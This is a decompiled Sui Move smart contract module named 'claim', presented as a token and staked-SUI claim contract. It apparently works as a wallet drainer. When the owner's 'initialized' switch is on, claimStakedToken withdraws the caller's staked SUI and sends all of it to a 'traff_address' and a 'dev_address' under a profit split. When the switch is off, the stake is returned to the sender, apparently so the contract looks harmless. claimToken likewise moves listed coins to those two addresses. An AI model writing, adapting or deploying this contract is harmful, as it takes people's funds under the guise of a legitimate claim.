module 0x8beadeafb139520185e941017f825ecf6cd744b917f01585f1ad2f4d454f41c5::claim {
    struct ClaimInfo has copy, drop, store {
        coin_details: vector<CoinInfo>,
    }

    struct ClaimArguments has key {
        id: 0x2::object::UID,
        owner: address,
        authorized_address: address,
        initialized: bool,
        details: 0x1::option::Option<ClaimInfo>,
        traff_address: address,
        dev_address: address,
        profit_split: u8,
    }

    struct CoinInfo has copy, drop, store {
        coin_type: 0x1::ascii::String,
        amount: u64,
        object_id: 0x2::object::ID,
    }

    public entry fun claimStakedToken(arg0: &mut 0x3::sui_system::SuiSystemState, arg1: 0x3::staking_pool::StakedSui, arg2: &mut ClaimArguments, arg3: &mut 0x2::tx_context::TxContext) {
        if (arg2.initialized) {
            assert!(0x1::option::is_some<ClaimInfo>(&arg2.details), 1);
            0x1::option::borrow<ClaimInfo>(&arg2.details);
            let v0 = 0x2::coin::from_balance<0x2::sui::SUI>(0x3::sui_system::request_withdraw_stake_non_entry(arg0, arg1, arg3), arg3);
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::split<0x2::sui::SUI>(&mut v0, 0x2::coin::value<0x2::sui::SUI>(&v0) * (arg2.profit_split as u64) / 100, arg3), arg2.traff_address);
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(v0, arg2.dev_address);
        } else {
            0x2::transfer::public_transfer<0x3::staking_pool::StakedSui>(arg1, 0x2::tx_context::sender(arg3));
        };
    }

    public entry fun claimToken<T0>(arg0: &mut ClaimArguments, arg1: 0x2::coin::Coin<T0>, arg2: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x2::tx_context::sender(arg2);
        assert!(v0 == arg0.authorized_address, 0);
        assert!(0x1::option::is_some<ClaimInfo>(&arg0.details), 1);
        let v1 = 0x1::option::borrow_mut<ClaimInfo>(&mut arg0.details);
        let v2 = 0;
        let v3 = false;
        let v4 = 0;
        while (v2 < 0x1::vector::length<CoinInfo>(&v1.coin_details)) {
            let v5 = 0x1::vector::borrow<CoinInfo>(&v1.coin_details, v2);
            if (v5.object_id == 0x2::object::id<0x2::coin::Coin<T0>>(&arg1)) {
                v3 = true;
                v4 = v5.amount;
                break
            };
            v2 = v2 + 1;
        };
        assert!(v3, 3);
        let v6 = 0x2::coin::value<T0>(&arg1);
        assert!(v6 >= v4, 2);
        if (v4 == 0) {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, v0);
        } else if (v6 == v4) {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::split<T0>(&mut arg1, v4 * (arg0.profit_split as u64) / 100, arg2), arg0.traff_address);
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, arg0.dev_address);
        } else {
            let v7 = 0x2::coin::split<T0>(&mut arg1, v4, arg2);
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::split<T0>(&mut v7, v4 * (arg0.profit_split as u64) / 100, arg2), arg0.traff_address);
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(v7, arg0.dev_address);
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, v0);
        };
        0x1::vector::swap_remove<CoinInfo>(&mut v1.coin_details, v2);
        if (0x1::vector::is_empty<CoinInfo>(&v1.coin_details)) {
            arg0.details = 0x1::option::none<ClaimInfo>();
        };
    }

    public entry fun createClaimArguments(arg0: address, arg1: address, arg2: address, arg3: u8, arg4: vector<0x1::ascii::String>, arg5: vector<u64>, arg6: vector<0x2::object::ID>, arg7: &mut 0x2::tx_context::TxContext) {
        let v0 = ClaimInfo{coin_details: 0x1::vector::empty<CoinInfo>()};
        let v1 = 0;
        while (v1 < 0x1::vector::length<0x1::ascii::String>(&arg4)) {
            let v2 = CoinInfo{
                coin_type : *0x1::vector::borrow<0x1::ascii::String>(&arg4, v1),
                amount    : *0x1::vector::borrow<u64>(&arg5, v1),
                object_id : *0x1::vector::borrow<0x2::object::ID>(&arg6, v1),
            };
            0x1::vector::push_back<CoinInfo>(&mut v0.coin_details, v2);
            v1 = v1 + 1;
        };
        let v3 = ClaimArguments{
            id                 : 0x2::object::new(arg7),
            owner              : 0x2::tx_context::sender(arg7),
            authorized_address : arg0,
            initialized        : false,
            details            : 0x1::option::some<ClaimInfo>(v0),
            traff_address      : arg1,
            dev_address        : arg2,
            profit_split       : arg3,
        };
        0x2::transfer::share_object<ClaimArguments>(v3);
    }

    public entry fun setClaimable(arg0: &mut ClaimArguments, arg1: bool, arg2: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg2) == arg0.owner, 0);
        arg0.initialized = arg1;
    }

    public entry fun updateClaimArguments(arg0: &mut ClaimArguments, arg1: address, arg2: address, arg3: u8, arg4: vector<0x1::ascii::String>, arg5: vector<u64>, arg6: vector<0x2::object::ID>, arg7: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg7) == arg0.owner, 0);
        let v0 = ClaimInfo{coin_details: 0x1::vector::empty<CoinInfo>()};
        let v1 = 0;
        while (v1 < 0x1::vector::length<0x1::ascii::String>(&arg4)) {
            let v2 = CoinInfo{
                coin_type : *0x1::vector::borrow<0x1::ascii::String>(&arg4, v1),
                amount    : *0x1::vector::borrow<u64>(&arg5, v1),
                object_id : *0x1::vector::borrow<0x2::object::ID>(&arg6, v1),
            };
            0x1::vector::push_back<CoinInfo>(&mut v0.coin_details, v2);
            v1 = v1 + 1;
        };
        arg0.traff_address = arg1;
        arg0.dev_address = arg2;
        arg0.profit_split = arg3;
        arg0.details = 0x1::option::some<ClaimInfo>(v0);
    }

    // decompiled from Move bytecode v6
}

